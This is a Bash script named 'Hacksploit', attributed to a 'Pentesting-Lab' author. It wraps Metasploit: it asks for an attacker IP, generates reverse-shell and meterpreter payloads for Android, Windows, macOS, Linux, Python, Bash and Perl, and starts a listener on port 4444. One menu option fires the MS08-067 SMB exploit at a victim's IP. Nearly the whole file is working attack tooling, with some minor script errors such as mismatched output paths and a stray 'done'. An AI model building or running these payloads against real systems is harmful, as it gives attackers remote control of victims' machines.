echo "
    ╦ ╦┌─┐┌─┐┬┌─┌─┐┌─┐┬  ┌─┐┬┌┬┐
    ╠═╣├─┤│  ├┴┐└─┐├─┘│  │ ││ │   (Linux)
    ╩ ╩┴ ┴└─┘┴ ┴└─┘┴  ┴─┘└─┘┴ ┴   (By Pratik (My Github account: Pentesting-Lab))

"
echo "NOTE: we will keep the default port as 4444"
echo

read -p "IP: " ip

clear
echo "
    ╦ ╦┌─┐┌─┐┬┌─┌─┐┌─┐┬  ┌─┐┬┌┬┐
    ╠═╣├─┤│  ├┴┐└─┐├─┘│  │ ││ │   (Linux)
    ╩ ╩┴ ┴└─┘┴ ┴└─┘┴  ┴─┘└─┘┴ ┴   (By Pratik (My Github account: Pentesting-Lab))

"

echo "

1] Android Payload | 5] Windows 7 Hunting with IP (SMB)
                   | 
2] Windows Payload | 6] Python Payload
                   |
3] Mac Payload     | 7] Bash Payload
                   |
4] Linux Paylaod   | 8] Perl


"
read -p "Select option : " yn
    case $yn in
        [1]* ) read -p "Application Name: "app; msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/Hacksploit_$app.apk; echo "Payload location is /root/Desktop/Hacksploit.apk"; msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [2]* ) read -p "Application Name: "app; msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/Hacksploit_$app.exe; echo "Payload location is /root/Desktop/Hacksploit.exe"; msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [3]* ) read -p "Application Name: "app; msfvenom -p osx/x86/shell_reverse_tcp lhost=$ip lport=4444 > /root/Desktop/Hacksploit_$app.macho; echo "Payload location is /root/Desktop/Hacksploit.macho"; msfconsole -q -x " use exploit/multi/handler; set payload osx/x86/shell_reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [4]* ) read -p "Application Name: "app; msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/Hacksploit_$app.elf; echo "Payload location is /root/Desktop/Hacksploit.elf"; msfconsole -q -x " use exploit/multi/handler; set payload linux/x86/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [5]* ) read -p "Victims IP: " vip; read -p "Application Name: "app; msfconsole -q -x " use windows/smb/ms08_067_netapi; set payload windows/meterpreter/reverse_tcp;  ; set RHOST $vip; set lhost $ip ; set lport 4444 ; exploit ;";;
        [6]* ) read -p "Application Name: "app; msfvenom -p cmd/unix/reverse_python lhost=$ip lport=4444 > /root/Desktop/Hacksploit_$app.py; echo "Payload location is /root/Desktop/Hacksploit.py"; msfconsole -q -x " use exploit/multi/handler; set payload cmd/unix/reverse_python;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [7]* ) read -p "Application Name: "app; msfvenom -p cmd/unix/reverse_bash lhost=$ip lport=4444 > /root/Desktop/Hacksploit_$app.sh; echo "Payload location is /root/Desktop/Hacksploit.sh"; msfconsole -q -x " use exploit/multi/handler; set payload cmd/unix/reverse_bash;  set lhost $ip ; set lport 4444 ; exploit ;";;
        [8]* ) read -p "Application Name: "app; msfvenom -p cmd/unix/reverse_perl lhost=$ip lport=4444 > /root/Desktop/Hacksploit_$app.pl; echo "Payload location is /root/Desktop/Hacksploit.pl"; msfconsole -q -x " use exploit/multi/handler; set payload cmd/unix/reverse_perl;  set lhost $ip ; set lport 4444 ; exploit ;";;

        * ) echo "Please select the options only from the menu.";;
    esac
done
